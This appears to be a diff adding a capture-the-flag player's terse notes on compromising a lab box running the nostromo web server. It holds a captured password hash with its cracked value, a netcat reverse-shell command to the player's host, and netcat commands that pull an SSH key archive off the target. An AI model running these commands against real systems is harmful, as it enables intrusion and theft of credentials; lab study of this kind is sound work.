@@ -1,0 +1,54 @@
+ip > 10.10.10.165
+
+Debain box, 22 + 80 open.  nostromo is the web config (alternative to apache?)
+
+looks like searchsploit has a RCE for this nostromo version...
+use the metasploit thing
+
+users | david
+
+
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+google says = f621ab7e3a901124807a64c7cc2cd4eb\
+
+Nowonly4me - ippsec vid
+
+
+nc -e /bin/sh 10.10.14.195 9001
+shell used ^
+
+the httpd conf file contains this:
+# HOMEDIRS [OPTIONAL]
+
+homedirs                /home
+homedirs_public         public_www
+
+which essentially means that there is a public_www dir within the users home dir.
+
+the public thing holds an ssh dir that needs to be sent back, so you can use netcat using the below command sequence:
+
+client -> nc -l -p 9000 > backup-ssh-identity-files.tgz
+server -> nc 10.10.14.195 9000 < backup-ssh-identity-files.tgz
+
+after running john on the ssh key, we get the password of hunter for the key allowing us to ssh in
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
